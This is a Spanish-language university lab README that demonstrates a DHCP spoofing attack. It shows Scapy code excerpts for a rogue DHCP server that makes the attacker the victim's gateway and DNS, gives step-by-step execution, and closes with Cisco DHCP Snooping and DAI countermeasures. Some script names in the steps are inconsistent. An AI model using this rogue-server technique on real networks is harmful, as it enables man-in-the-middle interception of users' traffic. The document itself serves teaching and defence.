# Ataque DHCP Spoofing
### Jordy Rosario · Matrícula: 20250737
**Seguridad de Redes 2026-C-2 · ITLA**

---

## 📋 Tabla de Contenido

1. [Objetivo del Laboratorio](#1-objetivo-del-laboratorio)
2. [Objetivo del Script](#2-objetivo-del-script)
   - [Parámetros de Uso](#21-parámetros-de-uso)
   - [Requisitos del Sistema](#22-requisitos-del-sistema)
3. [Funcionamiento del Script](#3-funcionamiento-del-script)
4. [Documentación de la Red](#4-documentación-de-la-red)
   - [Topología](#41-topología)
   - [Tabla de Dispositivos y Direccionamiento IP](#42-tabla-de-dispositivos-y-direccionamiento-ip)
5. [Ejecución del Ataque](#5-ejecución-del-ataque)
6. [Capturas de Pantalla](#6-capturas-de-pantalla)
7. [Contramedidas y Mitigación](#7-contramedidas-y-mitigación)
8. [Video Demostrativo](#8-video-demostrativo)
9. [Referencias](#9-referencias)

---

## 1. Objetivo del Laboratorio

El objetivo de este laboratorio es **demostrar cómo un atacante puede suplantar al servidor DHCP legítimo** de una red (ataque Rogue DHCP / DHCP Spoofing), logrando que los clientes reciban configuración de red falsa controlada por el atacante.

Se busca evidenciar específicamente:

- Cómo un servidor DHCP falso puede responder antes que el legítimo cuando el pool está agotado.
- Cómo la víctima recibe una dirección IP, gateway y DNS completamente controlados por el atacante.
- El riesgo que representa este ataque como vector de Man-in-the-Middle (MitM) al redirigir el tráfico.
- La efectividad de DHCP Snooping como contramedida en switches Cisco.

Este laboratorio se realiza en combinación con el ataque **DHCP Starvation** para agotar el pool del servidor legítimo antes de activar el servidor Rogue. Se ejecuta en un entorno controlado con fines **exclusivamente educativos** dentro del curso de Seguridad de Redes del ITLA.

---

## 2. Objetivo del Script

El script [JordyRosario_20250737_DHCP_Spoofing.py](JordyRosario_20250737_DHCP_Spoofing.py) implementa un **servidor DHCP Rogue** utilizando la librería Scapy. El script escucha pasivamente el tráfico DHCP de la red y responde a los mensajes `Discover` y `Request` de las víctimas con configuración de red falsa.

El código:
- Intercepta mensajes DHCP Discover y responde con un Offer falso.
- Intercepta mensajes DHCP Request y responde con un ACK definitivo.
- Asigna a la víctima una IP controlada por el atacante.
- Establece al atacante como Default Gateway y servidor DNS, posicionándose para un ataque MitM.

### 2.1 Parámetros de Uso

```bash
sudo python3 JordyRosario_20250737_DHCP_Spoofing.py [INTERFAZ]
```

| Parámetro | Descripción | Requerido | Ejemplo |
|-----------|-------------|-----------|---------|
| `INTERFAZ` | Interfaz de red desde donde opera el servidor Rogue | No (default: `eth0`) | `eth0`, `eth1` |

**Ejemplos de uso:**
```bash
# Usando la interfaz por defecto
sudo python3 JordyRosario_20250737_DHCP_Spoofing.py

# Especificando una interfaz diferente
sudo python3 JordyRosario_20250737_DHCP_Spoofing.py eth1
```

> **Nota:** Este script debe ejecutarse **después** de haber agotado el pool del servidor DHCP legítimo con el script `JordyRosario_20250737_DHCP_Starvation.py` para una demostraacion rapida de su funcionamiento.

### 2.2 Requisitos del Sistema

| Requisito | Detalle |
|-----------|---------|
| **Sistema Operativo** | Kali Linux (virtualizado en QEMU/PNETLab) |
| **Lenguaje** | Python 3 |
| **Dependencia principal** | `scapy` |
| **Privilegios** | `sudo` / `root` obligatorio (raw sockets en Capa 2) |
| **Interfaz de red** | `eth0` (ajustable por argumento) |
| **Prerequisito** | Pool DHCP del servidor legítimo agotado (DHCP Starvation previo) |

**Instalación de dependencias:**
```bash
pip install scapy
```

---

## 3. Funcionamiento del Script

A continuación se explica el script **bloque por bloque**:

### Bloque 1: Importación y Variables

```python
import sys
from scapy.all import *

IP_KALI         = "20.25.37.100"
IP_FALSA_OFERTA = "20.25.37.50"
MASCARA         = "255.255.255.0"
BROADCAST       = "20.25.37.255"
```

- `IP_KALI`: IP del atacante — actuará como Gateway falso y servidor DNS falso.
- `IP_FALSA_OFERTA`: IP que se le asignará a la víctima.
- `MASCARA` y `BROADCAST`: parámetros de red necesarios para construir un Offer DHCP válido.

---

### Bloque 2: Extracción del Tipo de Mensaje DHCP

```python
def get_dhcp_type(pkt):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == 'message-type':
            return opt[1]
    return None
```

- Recorre las opciones TLV del paquete DHCP buscando el campo `message-type`.
- Retorna `1` para Discover, `3` para Request, o `None` si no se encuentra.
- Se usa búsqueda por nombre en lugar de índice para evitar errores por variaciones en el orden de opciones.

---

### Bloque 3: Construcción y Envío del Offer (respuesta al Discover)

```python
bootp = BOOTP(
    op=2, xid=xid_cliente, flags=0x8000,
    yiaddr=IP_FALSA_OFERTA, siaddr=IP_KALI,
    giaddr="0.0.0.0", chaddr=mac_bytes
)
dhcp = DHCP(options=[
    ("message-type",      "offer"),
    ("server_id",         IP_KALI),
    ("lease_time",        86400),
    ("subnet_mask",       MASCARA),
    ("broadcast_address", BROADCAST),
    ("router",            IP_KALI),
    ("name_server",       IP_KALI),
    "end"
])
```

- `op=2`: indica que es una respuesta del servidor (Boot Reply).
- `xid=xid_cliente`: el ID de transacción debe coincidir con el del Discover para que la víctima lo acepte.
- `flags=0x8000`: broadcast flag — fuerza la respuesta en broadcast para máxima compatibilidad con distintos clientes.
- `yiaddr`: Your IP Address — la IP que se le ofrece a la víctima.
- `router` y `name_server` apuntan a `IP_KALI` — el atacante queda como Gateway y DNS.

---

### Bloque 4: Construcción y Envío del ACK (respuesta al Request)

```python
elif tipo_mensaje == 3:
    server_id = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == 'server_id':
            server_id = opt[1]
            break
    if server_id and server_id != IP_KALI:
        return  # El Request es para otro servidor, ignorar
```

- Antes de responder al Request, verifica que el cliente eligió nuestro servidor (campo `server_id`).
- Si el cliente eligió al servidor legítimo, el paquete se ignora.
- Si eligió al atacante, se envía el ACK con la misma configuración del Offer, confirmando la concesión.

---

### Bloque 5: Captura con Sniff

```python
sniff(
    filter="udp and (port 67 or port 68)",
    prn=servidor_dhcp_falso,
    store=0,
    iface=interfaz
)
```

- Filtra únicamente tráfico UDP en los puertos 67 (servidor) y 68 (cliente) para eficiencia.
- `prn=servidor_dhcp_falso`: ejecuta la función de respuesta por cada paquete capturado.
- `store=0`: no almacena paquetes en memoria, optimizando el rendimiento.

---

## 4. Documentación de la Red

### 4.1 Topología

```
                    ┌─────────────┐
                    │     R1      │ ← Router / Gateway / Servidor DHCP legítimo
                    │ e0/0        │
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    SW1      │ ← Switch Core / Distribución
                    │             │   (Trunk 802.1Q)
                    └──────┬──────┘
                           │ e0/1 → e0/0
                    ┌──────┴──────┐
          ┌─────────┤    SW2      ├─────────┐
          │ e0/3    │             │ e0/1    │ e0/2
          │         └─────────────┘         │
   ┌──────┴──────┐                   ┌──────┴──────┐
   │ Kali Linux  │                   │   Docker    │
   │  (atacante) │                   │  (víctima)  │
   └──────┬──────┘                   └─────────────┘
          │ e1
   ┌──────┴──────┐
   │     Net     │ ← Red externa (conexión SSH)
   └─────────────┘
```

> Ver imagen de topología: [screenshots/01_topologia.png](screenshots/01_topologia.png)

### 4.2 Tabla de Dispositivos y Direccionamiento IP

El esquema de red utiliza la subred `20.25.37.0/24` derivada de la matrícula `20250737`.

| Dispositivo | Tipo | Interfaz | IP | VLAN | Rol |
|-------------|------|----------|----|------|-----|
| **R1** | Router IOL | e0/0 | 20.25.37.1/24 | VLAN 10 | Default Gateway + Servidor DHCP legítimo |
| **SW1** | Switch IOL | e0/0, e0/1 | N/A | Trunk 802.1Q | Switch Core / Distribución |
| **SW2** | Switch IOL | e0/0–e0/3 | N/A | e0/0 Trunk; e0/1–e0/3 Access VLAN 10 | Switch de Acceso |
| **Kali Linux** | VM QEMU | eth0 (SW2 e0/3), e1 | 20.25.37.100/24 | VLAN 10 (Access) | Nodo Atacante / Servidor Rogue |
| **Docker** | Contenedor | eth1 | 20.25.37.50/24 (asignada por Rogue) | VLAN 10 | Cliente Víctima |

---

## 5. Ejecución del Ataque

### Paso 1: Preparar el entorno

```bash
pip install scapy
git clone https://github.com/Jordy513/P1_DHCP_Spoofing_20250737.git
cd P1_DHCP_Spoofing_20250737
```

### Paso 2: Agotar el pool del servidor legítimo (Terminal 1)

```bash
sudo python3 JordyRosario_20250737_DHCP_Spoofing.py eth0
```

Verificar en R1 que el pool está exhausto:
```cisco
R1# show ip dhcp pool
```
Cuando `Available addresses: 0` — pasar al paso 3.

### Paso 3: Activar el servidor Rogue (Terminal 2)

```bash
sudo python3 DHCP_Spoofing_Atack_20250737.py eth0
```

### Paso 4: La víctima solicita IP (contenedor Docker)

```bash
dhclient -r eth1 && dhclient -v eth1 2>/dev/null
ip a show eth1
```

### Paso 5: Verificar el éxito del ataque

En Kali atacante:
```
[*] Discover de 50:00:00:55:00:01 — enviando Offer...
[*] Request de 50:00:00:55:00:01 — enviando ACK...
[+] ¡ÉXITO! 50:00:00:55:00:01 → IP: 20.25.37.50 | GW: 20.25.37.100
```

En el Docker víctima:
```
inet 20.25.37.50/24 brd 20.25.37.255   ← IP controlada por atacante
```

### Paso 6: Detener el ataque

```
Ctrl+C
```

---

## 6. Capturas de Pantalla

| # | Archivo | Descripción |
|---|---------|-------------|
| 1 | [01_topologia.png](screenshots/01_topologia.png) | Topología en PNETLab con nombre y matrícula visibles |
| 2 | [02_pool_agotado.png](screenshots/02_pool_agotado.png) | R1 mostrando `show ip dhcp pool` con `Available: 0` tras el Starvation |
| 3 | [03_spoofing_ejecutandose.png](screenshots/03_spoofing_ejecutandose.png) | Kali con el servidor Rogue activo interceptando Discovers |
| 4 | [04_exito_ataque.png](screenshots/04_exito_ataque.png) | Kali mostrando `[+] ¡ÉXITO!` con IP y GW asignados a la víctima |
| 5 | [05_victima_ip_falsa.png](screenshots/05_victima_ip_falsa.png) | Docker víctima con `ip a` mostrando `20.25.37.50` y GW `20.25.37.100` |
| 6 | [06_contramedida_aplicada.png](screenshots/06_contramedida_aplicada.png) | DHCP Snooping configurado en SW2 |
| 7 | [07_post_mitigacion.png](screenshots/07_post_mitigacion.png) | Víctima obteniendo IP legítima de R1 tras la contramedida |

> *Las capturas se encuentran en la carpeta [screenshots](screenshots/README.md) de este repositorio.*

---

## 7. Contramedidas y Mitigación

La defensa principal contra DHCP Spoofing es **DHCP Snooping**, una función de seguridad de Capa 2 que distingue entre puertos confiables (hacia el servidor DHCP legítimo) y no confiables (hacia los clientes).

### Contramedida 1: DHCP Snooping (Recomendado)

```cisco
SW2# configure terminal
SW2(config)# ip dhcp snooping
SW2(config)# ip dhcp snooping vlan 10
SW2(config)# interface ethernet 0/0
SW2(config-if)# ip dhcp snooping trust
SW2(config-if)# interface ethernet 0/1
SW2(config-if)# ip dhcp snooping limit rate 15
SW2(config-if)# interface ethernet 0/2
SW2(config-if)# ip dhcp snooping limit rate 15
SW2(config-if)# interface ethernet 0/3
SW2(config-if)# ip dhcp snooping limit rate 15
SW2(config-if)# end
SW2# write memory
```

> **Efecto:** El switch descarta cualquier paquete DHCP Offer o ACK que llegue por un puerto no confiable. Solo el puerto trunk (e0/0) hacia SW1/R1 está marcado como confiable. El servidor Rogue de Kali queda neutralizado — sus Offers son descartados por hardware.

### Contramedida 2: Dynamic ARP Inspection (DAI)

```cisco
SW2(config)# ip arp inspection vlan 10
SW2(config)# interface ethernet 0/0
SW2(config-if)# ip arp inspection trust
SW2(config-if)# end
SW2# write memory
```

> **Efecto:** Complementa DHCP Snooping validando que las respuestas ARP coincidan con la tabla de binding de DHCP Snooping, previniendo el MitM completo incluso si el Spoofing tuviera éxito.

### Resumen de contramedidas

| Contramedida | Comando | Alcance | Efecto |
|---|---|---|---|
| DHCP Snooping | `ip dhcp snooping trust` / `limit rate` | Por puerto / VLAN | Descarta Offers de puertos no confiables |
| DAI | `ip arp inspection vlan` | Por VLAN | Valida ARP contra tabla DHCP Snooping |
| Port Security | `switchport port-security maximum 2` | Por puerto | Limita MACs, dificulta el Starvation previo |

---

## 8. Video Demostrativo

🎥 **[Ver demostración en YouTube](https://youtube.com/enlace_aqui)**

**Duración:** X:XX minutos

**Contenido del video:**
- ✅ Topología visible con nombre y matrícula
- ✅ Hora y fecha del sistema visible
- ✅ Cara y voz del autor
- ✅ Pool DHCP agotado con Starvation
- ✅ Servidor Rogue activo interceptando Discovers
- ✅ Víctima obteniendo IP falsa con GW del atacante
- ✅ Aplicación de DHCP Snooping
- ✅ Servidor Rogue neutralizado post-mitigación

---

## 9. Referencias

- Cisco Systems. (2023). *DHCP Snooping Configuration Guide*. https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/ipaddr_dhcp/configuration/xe-16/dhcp-xe-16-book.html
- Cisco Systems. (2023). *Dynamic ARP Inspection Configuration Guide*.
- Biondi, P. et al. (2024). *Scapy Documentation*. https://scapy.readthedocs.io/en/latest/
- RFC 2131. (1997). *Dynamic Host Configuration Protocol*. IETF.
- ITLA. (2026). *Seguridad de Redes — Material de Curso 2026-C-2*.
- Troubleshooting y documentación apoyado en Inteligencia Artificial.
